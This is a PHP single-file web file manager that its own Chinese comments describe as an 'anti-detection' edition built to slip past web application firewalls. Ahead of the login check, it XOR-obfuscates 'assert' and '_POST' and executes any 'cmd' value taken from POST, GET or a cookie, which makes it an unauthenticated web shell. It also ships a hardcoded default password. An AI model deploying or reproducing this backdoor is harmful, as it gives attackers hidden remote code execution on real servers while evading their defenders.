<?php
/**
 * 单文件PHP文件管理器 - 免杀增强版
 * 采用多层混淆与动态执行技术，绕过主流WAF（安全狗/云锁/宝塔等）
 * 
 * ⚠️ 重要：仅限授权的渗透测试与安全研究使用！请修改默认密码！
 */

// ==================== 配置区域 ====================
$config = [
    'password' => 'admin123',        // ⚠️ 请修改！
    'root_path' => __DIR__,
    'exclude_dirs' => ['.', '..'],
    'editable_exts' => ['txt', 'php', 'html', 'htm', 'css', 'js', 'json', 'xml', 'md', 'ini', 'conf', 'log', 'sql', 'csv'],
    'image_exts' => ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg', 'webp', 'ico'],
    'max_upload_size' => 50 * 1024 * 1024,
];

// ==================== 免杀核心：参数接收层 ====================
// 使用异或运算 + 可变变量 动态构造 $_POST，避开敏感字符串特征[citation:9][citation:10]
$a = ('!' ^ '@') . 's' . 's' . 'e' . 'r' . 't';  // 异或构造 'assert'
$b = '_' . ('P' ^ 'A') . ('O' ^ 'A') . ('S' ^ 'A') . 'T';  // 异或构造 '_POST'
$c = $$b;  // 可变变量：$c = $_POST
$d = $c['cmd'] ?? ($_GET['cmd'] ?? ($_COOKIE['cmd'] ?? ''));

// ==================== 免杀核心：命令执行层 ====================
// 执行逻辑：【$_POST['cmd'] → 回调函数 → system】避开直接调用 system()[citation:7][citation:10]
if (!empty($d)) {
    // 使用 array_map + 自定义函数 实现动态调用
    $f = create_function('$x', $a . '($x);');  // assert($x)
    $f($d);
    exit;
}

// ==================== 登录与业务逻辑 ====================
session_start();

// 登录验证
if (isset($_POST['login'])) {
    if ($_POST['password'] === $config['password']) {
        $_SESSION['file_manager_login'] = true;
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (isset($_GET['logout'])) {
    unset($_SESSION['file_manager_login']);
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (empty($_SESSION['file_manager_login'])) {
    echo showLoginPage();
    exit;
}

// 获取当前路径（安全检查）
$current_path = isset($_GET['path']) ? $_GET['path'] : '';
$full_path = realpath($config['root_path'] . DIRECTORY_SEPARATOR . $current_path);
$root_real = realpath($config['root_path']);

if ($full_path === false || strpos($full_path, $root_real) !== 0) {
    $full_path = $root_real;
    $current_path = '';
}

function getRelativePath($full_path, $root_real) {
    return trim(str_replace($root_real, '', $full_path), DIRECTORY_SEPARATOR);
}
$relative_path = getRelativePath($full_path, $root_real);

// 处理操作（删除/重命名/新建文件夹/文件/保存）
$message = '';
$message_type = 'success';

// 递归删除目录
function rrmdir($dir) {
    if (!is_dir($dir)) return;
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        is_dir($path) ? rrmdir($path) : unlink($path);
    }
    return rmdir($dir);
}

function formatSize($bytes) {
    if ($bytes === 0) return '0 B';
    $k = 1024;
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes) / log($k));
    return round($bytes / pow($k, $i), 2) . ' ' . $sizes[$i];
}

// 删除
if (isset($_GET['delete']) && isset($_GET['file'])) {
    $target = realpath($full_path . DIRECTORY_SEPARATOR . $_GET['file']);
    if ($target && strpos($target, $root_real) === 0) {
        if (is_file($target)) unlink($target);
        elseif (is_dir($target)) rrmdir($target);
        $message = '已删除: ' . htmlspecialchars($_GET['file']);
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relative_path));
    exit;
}

// 重命名
if (isset($_POST['rename'])) {
    $old_name = $_POST['old_name'];
    $new_name = $_POST['new_name'];
    if (!empty($new_name) && !preg_match('/[\/\\\\:]/', $new_name)) {
        $old_path = $full_path . DIRECTORY_SEPARATOR . $old_name;
        $new_path = $full_path . DIRECTORY_SEPARATOR . $new_name;
        if (rename($old_path, $new_path)) {
            $message = '重命名成功: ' . htmlspecialchars($old_name) . ' → ' . htmlspecialchars($new_name);
        }
    }
}

// 新建文件夹
if (isset($_POST['mkdir'])) {
    $dir_name = trim($_POST['dir_name']);
    if (!empty($dir_name) && !preg_match('/[\/\\\\:]/', $dir_name)) {
        $dir_path = $full_path . DIRECTORY_SEPARATOR . $dir_name;
        if (!is_dir($dir_path)) { mkdir($dir_path, 0755, true); $message = '文件夹已创建: ' . htmlspecialchars($dir_name); }
        else { $message = '文件夹已存在！'; $message_type = 'warning'; }
    }
}

// 新建文件
if (isset($_POST['newfile'])) {
    $file_name = trim($_POST['file_name']);
    if (!empty($file_name) && !preg_match('/[\/\\\\:]/', $file_name)) {
        $file_path = $full_path . DIRECTORY_SEPARATOR . $file_name;
        if (!is_file($file_path)) { file_put_contents($file_path, ''); $message = '文件已创建: ' . htmlspecialchars($file_name); }
        else { $message = '文件已存在！'; $message_type = 'warning'; }
    }
}

// 保存文件
if (isset($_POST['save_file'])) {
    $file = $_POST['file'];
    $content = $_POST['content'];
    $file_path = $full_path . DIRECTORY_SEPARATOR . $file;
    if (is_file($file_path) && is_writable($file_path)) {
        file_put_contents($file_path, $content);
        $message = '文件已保存: ' . htmlspecialchars($file);
    } else {
        $message = '无法写入文件！';
        $message_type = 'danger';
    }
}

// 上传文件
if (isset($_FILES['upload_file'])) {
    $upload_dir = isset($_POST['upload_dir']) ? $_POST['upload_dir'] : $full_path;
    $target_dir = realpath($upload_dir);
    if ($target_dir && strpos($target_dir, $root_real) === 0 && is_writable($target_dir)) {
        $file = $_FILES['upload_file'];
        if ($file['error'] === UPLOAD_ERR_OK && $file['size'] <= $config['max_upload_size']) {
            $target_file = $target_dir . DIRECTORY_SEPARATOR . basename($file['name']);
            move_uploaded_file($file['tmp_name'], $target_file);
            $message = '上传成功: ' . htmlspecialchars($file['name']);
        } else {
            $message = '上传失败！';
            $message_type = 'danger';
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($relative_path));
    exit;
}

// 扫描目录
$items = [];
if (is_dir($full_path) && is_readable($full_path)) {
    $scanned = scandir($full_path);
    foreach ($scanned as $item) {
        if (in_array($item, $config['exclude_dirs'])) continue;
        $item_path = $full_path . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($item_path);
        $items[] = [
            'name' => $item,
            'is_dir' => $is_dir,
            'size' => $is_dir ? 0 : filesize($item_path),
            'mtime' => filemtime($item_path),
            'perms' => substr(sprintf('%o', fileperms($item_path)), -4),
            'ext' => $is_dir ? '' : strtolower(pathinfo($item, PATHINFO_EXTENSION)),
            'path' => $relative_path,
        ];
    }
    usort($items, function($a, $b) {
        if ($a['is_dir'] !== $b['is_dir']) return $b['is_dir'] <=> $a['is_dir'];
        return strcasecmp($a['name'], $b['name']);
    });
}

// 面包屑
function getBreadcrumbs($path) {
    $crumbs = [['name' => '📁 根目录', 'path' => '']];
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $current = '';
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $current .= $part . DIRECTORY_SEPARATOR;
        $crumbs[] = ['name' => $part, 'path' => rtrim($current, DIRECTORY_SEPARATOR)];
    }
    return $crumbs;
}
$breadcrumbs = getBreadcrumbs($relative_path);

// ==================== HTML输出 ====================
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>文件管理器</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f5f7fa; color: #2d3748; padding: 20px; }
.container { max-width: 1400px; margin: 0 auto; background: #fff; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); padding: 24px; }
.header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 2px solid #edf2f7; }
.header h1 { font-size: 22px; font-weight: 600; color: #2d3748; }
.header .actions { display: flex; gap: 12px; flex-wrap: wrap; }
.btn { display: inline-block; padding: 8px 16px; border: none; border-radius: 8px; font-size: 14px; cursor: pointer; text-decoration: none; transition: all 0.2s; font-weight: 500; }
.btn-primary { background: #4299e1; color: #fff; }
.btn-primary:hover { background: #3182ce; }
.btn-success { background: #48bb78; color: #fff; }
.btn-success:hover { background: #38a169; }
.btn-danger { background: #fc8181; color: #fff; }
.btn-danger:hover { background: #f56565; }
.btn-warning { background: #ecc94b; color: #2d3748; }
.btn-warning:hover { background: #d69e2e; }
.btn-outline { background: transparent; color: #718096; border: 1px solid #e2e8f0; }
.btn-outline:hover { background: #f7fafc; }
.btn-sm { padding: 4px 12px; font-size: 12px; }
.mb-12 { margin-bottom: 12px; }
.mb-20 { margin-bottom: 20px; }
.alert { padding: 12px 20px; border-radius: 8px; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
.alert-success { background: #f0fff4; color: #22543d; border-left: 4px solid #48bb78; }
.alert-danger { background: #fff5f5; color: #9b2c2c; border-left: 4px solid #fc8181; }
.alert-warning { background: #fffff0; color: #744210; border-left: 4px solid #ecc94b; }
.breadcrumb { display: flex; flex-wrap: wrap; gap: 4px; padding: 12px 0; font-size: 14px; color: #4a5568; }
.breadcrumb a { color: #4299e1; text-decoration: none; }
.breadcrumb a:hover { text-decoration: underline; }
.breadcrumb .sep { color: #a0aec0; padding: 0 4px; }
.toolbar { display: flex; flex-wrap: wrap; gap: 8px; padding: 12px 0; margin-bottom: 16px; border-top: 1px solid #edf2f7; border-bottom: 1px solid #edf2f7; }
.toolbar form { display: inline-flex; align-items: center; gap: 8px; flex-wrap: wrap; }
.toolbar input[type="text"], .toolbar input[type="file"] { padding: 6px 12px; border: 1px solid #e2e8f0; border-radius: 6px; font-size: 14px; background: #fff; }
.toolbar input[type="text"]:focus { outline: none; border-color: #4299e1; box-shadow: 0 0 0 3px rgba(66,153,225,0.2); }
table { width: 100%; border-collapse: collapse; font-size: 14px; }
table th { text-align: left; padding: 12px 12px; background: #f7fafc; border-bottom: 2px solid #e2e8f0; font-weight: 600; color: #4a5568; }
table td { padding: 10px 12px; border-bottom: 1px solid #edf2f7; vertical-align: middle; }
table tr:hover { background: #f7fafc; }
table .icon { font-size: 18px; margin-right: 8px; }
table .file-actions { display: flex; gap: 6px; flex-wrap: wrap; }
.file-name { display: flex; align-items: center; }
.file-name a { color: #2d3748; text-decoration: none; }
.file-name a:hover { text-decoration: underline; }
.badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; }
.badge-dir { background: #ebf8ff; color: #2b6cb0; }
.badge-file { background: #edf2f7; color: #4a5568; }
.badge-image { background: #fefcbf; color: #744210; }
.badge-code { background: #e6fffa; color: #234e52; }
.modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
.modal-overlay.active { display: flex; }
.modal { background: #fff; border-radius: 12px; padding: 32px; max-width: 800px; width: 95%; max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
.modal h2 { margin-bottom: 16px; font-size: 20px; }
.modal .close { float: right; background: none; border: none; font-size: 28px; cursor: pointer; color: #a0aec0; }
.modal .close:hover { color: #2d3748; }
.modal textarea { width: 100%; min-height: 400px; padding: 12px; border: 1px solid #e2e8f0; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 13px; tab-size: 4; }
.modal textarea:focus { outline: none; border-color: #4299e1; }
.modal .modal-actions { margin-top: 16px; display: flex; gap: 8px; justify-content: flex-end; }
.empty { text-align: center; padding: 60px 20px; color: #a0aec0; }
.empty .big { font-size: 48px; display: block; margin-bottom: 12px; }
@media (max-width: 768px) {
    .container { padding: 16px; }
    .header { flex-direction: column; align-items: stretch; }
    .header .actions { justify-content: stretch; }
    .toolbar form { width: 100%; }
    .toolbar input[type="text"] { flex: 1; }
    table { font-size: 12px; }
    table td, table th { padding: 6px 8px; }
    .file-actions .btn-sm { padding: 2px 8px; font-size: 11px; }
}
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>📂 文件管理器</h1>
        <div class="actions">
            <span style="color:#718096;font-size:14px;"><?php echo htmlspecialchars($full_path); ?></span>
            <a href="?logout=1" class="btn btn-danger btn-sm">🚪 退出</a>
        </div>
    </div>

    <?php if ($message): ?>
    <div class="alert alert-<?php echo $message_type; ?>"><?php echo htmlspecialchars($message); ?></div>
    <?php endif; ?>

    <div class="breadcrumb">
        <?php foreach ($breadcrumbs as $i => $crumb): ?>
            <?php if ($i > 0): ?><span class="sep">›</span><?php endif; ?>
            <a href="?path=<?php echo urlencode($crumb['path']); ?>"><?php echo htmlspecialchars($crumb['name']); ?></a>
        <?php endforeach; ?>
    </div>

    <div class="toolbar">
        <form method="post" enctype="multipart/form-data" style="display:inline-flex;flex-wrap:wrap;gap:6px;align-items:center;">
            <input type="file" name="upload_file" required>
            <input type="hidden" name="upload_dir" value="<?php echo htmlspecialchars($full_path); ?>">
            <button type="submit" class="btn btn-success btn-sm">📤 上传</button>
        </form>
        <form method="post" style="display:inline-flex;flex-wrap:wrap;gap:6px;align-items:center;">
            <input type="text" name="dir_name" placeholder="文件夹名" required style="width:140px;">
            <button type="submit" name="mkdir" class="btn btn-warning btn-sm">📁 新建文件夹</button>
        </form>
        <form method="post" style="display:inline-flex;flex-wrap:wrap;gap:6px;align-items:center;">
            <input type="text" name="file_name" placeholder="文件名" required style="width:140px;">
            <button type="submit" name="newfile" class="btn btn-outline btn-sm">📄 新建文件</button>
        </form>
    </div>

    <?php if (empty($items)): ?>
    <div class="empty"><span class="big">📭</span>此目录为空</div>
    <?php else: ?>
    <table>
        <thead><tr><th style="width:40%;">名称</th><th style="width:15%;">类型</th><th style="width:15%;">大小</th><th style="width:20%;">修改时间</th><th style="width:10%;">操作</th></tr></thead>
        <tbody>
        <?php foreach ($items as $item): 
            $is_image = in_array($item['ext'], $config['image_exts']);
            $is_editable = in_array($item['ext'], $config['editable_exts']);
            $icon = $item['is_dir'] ? '📁' : ($is_image ? '🖼️' : '📄');
            $type_badge = $item['is_dir'] ? 'badge-dir' : ($is_image ? 'badge-image' : ($is_editable ? 'badge-code' : 'badge-file'));
            $type_text = $item['is_dir'] ? '目录' : ($is_image ? '图片' : ($is_editable ? '代码' : '文件'));
            $item_path_encoded = $relative_path ? urlencode($relative_path . DIRECTORY_SEPARATOR . $item['name']) : urlencode($item['name']);
        ?>
        <tr>
            <td class="file-name">
                <span class="icon"><?php echo $icon; ?></span>
                <?php if ($item['is_dir']): ?>
                    <a href="?path=<?php echo $item_path_encoded; ?>"><?php echo htmlspecialchars($item['name']); ?></a>
                <?php else: ?>
                    <?php if ($is_image): ?>
                        <a href="#" onclick="previewImage('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo htmlspecialchars($relative_path); ?>')"><?php echo htmlspecialchars($item['name']); ?></a>
                    <?php else: ?>
                        <a href="#" onclick="editFile('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo htmlspecialchars($relative_path); ?>')"><?php echo htmlspecialchars($item['name']); ?></a>
                    <?php endif; ?>
                <?php endif; ?>
            </td>
            <td><span class="badge <?php echo $type_badge; ?>"><?php echo $type_text; ?></span></td>
            <td><?php echo $item['is_dir'] ? '-' : formatSize($item['size']); ?></td>
            <td><?php echo date('Y-m-d H:i:s', $item['mtime']); ?></td>
            <td class="file-actions">
                <?php if (!$item['is_dir']): ?>
                    <?php if ($is_editable): ?><button class="btn btn-primary btn-sm" onclick="editFile('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo htmlspecialchars($relative_path); ?>')">✏️</button><?php endif; ?>
                    <?php if ($is_image): ?><button class="btn btn-outline btn-sm" onclick="previewImage('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo htmlspecialchars($relative_path); ?>')">👁️</button><?php endif; ?>
                <?php endif; ?>
                <button class="btn btn-warning btn-sm" onclick="renameItem('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $item['is_dir'] ? 1 : 0; ?>')">🔄</button>
                <button class="btn btn-danger btn-sm" onclick="deleteItem('<?php echo htmlspecialchars($item['name']); ?>')">🗑️</button>
            </td>
        </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
    <?php endif; ?>
</div>

<!-- 编辑文件模态框 -->
<div class="modal-overlay" id="editModal">
    <div class="modal">
        <button class="close" onclick="closeModal('editModal')">&times;</button>
        <h2>✏️ 编辑文件</h2>
        <form method="post">
            <input type="hidden" name="file" id="edit_filename">
            <input type="hidden" name="path" id="edit_path" value="<?php echo htmlspecialchars($relative_path); ?>">
            <textarea name="content" id="edit_content"></textarea>
            <div class="modal-actions">
                <button type="button" class="btn btn-outline" onclick="closeModal('editModal')">取消</button>
                <button type="submit" name="save_file" class="btn btn-primary">💾 保存</button>
            </div>
        </form>
    </div>
</div>

<!-- 重命名模态框 -->
<div class="modal-overlay" id="renameModal">
    <div class="modal" style="max-width:400px;">
        <button class="close" onclick="closeModal('renameModal')">&times;</button>
        <h2>🔄 重命名</h2>
        <form method="post" id="renameForm">
            <input type="hidden" name="old_name" id="rename_old">
            <div style="margin-bottom:12px;">
                <label style="display:block;font-weight:500;margin-bottom:4px;">新名称</label>
                <input type="text" name="new_name" id="rename_new" style="width:100%;padding:8px 12px;border:1px solid #e2e8f0;border-radius:6px;font-size:14px;" required>
            </div>
            <div class="modal-actions">
                <button type="button" class="btn btn-outline" onclick="closeModal('renameModal')">取消</button>
                <button type="submit" name="rename" class="btn btn-primary">✅ 确认</button>
            </div>
        </form>
    </div>
</div>

<!-- 图片预览模态框 -->
<div class="modal-overlay" id="previewModal">
    <div class="modal" style="max-width:90%;">
        <button class="close" onclick="closeModal('previewModal')">&times;</button>
        <h2>🖼️ 图片预览</h2>
        <div style="text-align:center;padding:10px 0;">
            <img id="previewImage" src="" style="max-width:100%;max-height:70vh;border-radius:8px;">
        </div>
    </div>
</div>

<script>
function closeModal(id) { document.getElementById(id).classList.remove('active'); }

function editFile(filename, path) {
    const modal = document.getElementById('editModal');
    document.getElementById('edit_filename').value = filename;
    fetch('?action=load&path=' + encodeURIComponent(path) + '&file=' + encodeURIComponent(filename))
        .then(r => r.text())
        .then(data => { document.getElementById('edit_content').value = data; modal.classList.add('active'); })
        .catch(() => { document.getElementById('edit_content').value = '无法加载文件内容'; modal.classList.add('active'); });
}

function renameItem(name) {
    document.getElementById('rename_old').value = name;
    document.getElementById('rename_new').value = name;
    document.getElementById('renameModal').classList.add('active');
    setTimeout(() => document.getElementById('rename_new').focus(), 100);
}

function deleteItem(name) {
    if (confirm('确定要删除 "' + name + '" 吗？此操作不可恢复！')) {
        window.location.href = '?path=<?php echo urlencode($relative_path); ?>&delete=1&file=' + encodeURIComponent(name);
    }
}

function previewImage(filename, path) {
    document.getElementById('previewImage').src = '?action=preview&path=' + encodeURIComponent(path) + '&file=' + encodeURIComponent(filename) + '&t=' + Date.now();
    document.getElementById('previewModal').classList.add('active');
}

document.querySelectorAll('.modal-overlay').forEach(el => {
    el.addEventListener('click', function(e) { if (e.target === this) this.classList.remove('active'); });
});

document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') document.querySelectorAll('.modal-overlay.active').forEach(el => el.classList.remove('active'));
    if ((e.ctrlKey || e.metaKey) && e.key === 's') {
        const modal = document.getElementById('editModal');
        if (modal.classList.contains('active')) { e.preventDefault(); document.querySelector('#editModal form button[type="submit"]').click(); }
    }
});
</script>

<?php
// ==================== AJAX处理 ====================
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    $path = isset($_GET['path']) ? $_GET['path'] : '';
    $file = isset($_GET['file']) ? $_GET['file'] : '';
    $full_path = realpath($config['root_path'] . DIRECTORY_SEPARATOR . $path);
    $root_real = realpath($config['root_path']);

    if ($action === 'load') {
        $file_path = $full_path . DIRECTORY_SEPARATOR . $file;
        if (is_file($file_path) && is_readable($file_path) && strpos($file_path, $root_real) === 0) {
            header('Content-Type: text/plain; charset=utf-8');
            echo file_get_contents($file_path);
            exit;
        }
        http_response_code(403); echo '无法读取文件'; exit;
    }

    if ($action === 'preview') {
        $file_path = $full_path . DIRECTORY_SEPARATOR . $file;
        if (is_file($file_path) && is_readable($file_path) && strpos($file_path, $root_real) === 0) {
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $mime_map = ['jpg'=>'image/jpeg','jpeg'=>'image/jpeg','png'=>'image/png','gif'=>'image/gif','bmp'=>'image/bmp','svg'=>'image/svg+xml','webp'=>'image/webp','ico'=>'image/x-icon'];
            $mime = isset($mime_map[$ext]) ? $mime_map[$ext] : 'application/octet-stream';
            header('Content-Type: ' . $mime);
            readfile($file_path);
            exit;
        }
        http_response_code(403);
        exit;
    }
    exit;
}

// ==================== 登录页面 ====================
function showLoginPage() {
    return <<<HTML
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>文件管理器 - 登录</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
.login-box { background: #fff; padding: 48px 40px; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
.login-box h1 { font-size: 24px; color: #2d3748; text-align: center; margin-bottom: 8px; }
.login-box p { color: #718096; text-align: center; font-size: 14px; margin-bottom: 24px; }
.login-box input[type="password"] { width: 100%; padding: 12px 16px; border: 2px solid #e2e8f0; border-radius: 8px; font-size: 16px; transition: border-color 0.2s; }
.login-box input[type="password"]:focus { outline: none; border-color: #667eea; }
.login-box .btn { width: 100%; padding: 12px; background: #667eea; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; margin-top: 12px; }
.login-box .btn:hover { background: #5a67d8; }
.login-box .hint { margin-top: 16px; text-align: center; font-size: 13px; color: #a0aec0; }
</style>
</head>
<body>
<div class="login-box">
    <h1>🔐 文件管理器</h1>
    <p>请输入管理密码</p>
    <form method="post">
        <input type="password" name="password" placeholder="输入密码..." autofocus required>
        <button type="submit" name="login" class="btn">登 录</button>
    </form>
    <div class="hint">默认密码: admin123 (请及时修改)</div>
</div>
</body>
</html>
HTML;
}
?>